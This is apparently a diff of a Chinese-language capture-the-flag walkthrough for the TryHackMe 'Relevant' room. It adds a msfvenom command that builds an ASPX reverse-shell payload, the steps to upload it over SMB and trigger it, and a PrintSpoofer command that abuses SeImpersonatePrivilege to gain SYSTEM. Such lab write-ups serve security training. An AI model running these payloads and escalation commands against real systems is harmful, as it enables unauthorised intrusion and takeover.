@@ -1,5 +1,7 @@
 # Relevant
 
+
+### 信息收集
 nmap快速扫描：
 ```
 PORT      STATE SERVICE
@@ -89,9 +91,24 @@ QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk%
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f aspx -o  reverse-shell.aspx
 ```
-登陆进入smb使用put把反shell放进smb共享目录里，然后访问http://IP/nt4wrksv/reshell执行。
+登陆进入smb使用put把反shell放进smb共享目录里，然后访问http://IP:49663/nt4wrksv/reshell执行。
+![Alt text](../../../picture/THM/relevant/Snipaste_2024-09-08_14-55-05.png)
 
 
 
+### 提权
 
-###
+进入系统后先看看自己有哪些权限：
+![Alt text](../../../picture/THM/relevant/Snipaste_2024-09-08_16-08-59.png)
+
+这里的SeImpersonatePrivilege权限有一个很著名的漏洞：PrintSpoofer漏洞。
+直接去github找一下有没有可以使用的工具：
+https://github.com/k4sth4/PrintSpoofer
+
+```cmd
+PrintSpoofer.exe -i -c powershell
+```
+![Alt text](../../../picture/THM/relevant/Snipaste_2024-09-08_16-05-04.png)
+
+这个漏洞使用工具比较无脑，这里放上工具的源码：
+https://github.com/itm4n/PrintSpoofer/blob/master/PrintSpoofer/PrintSpoofer.cpp
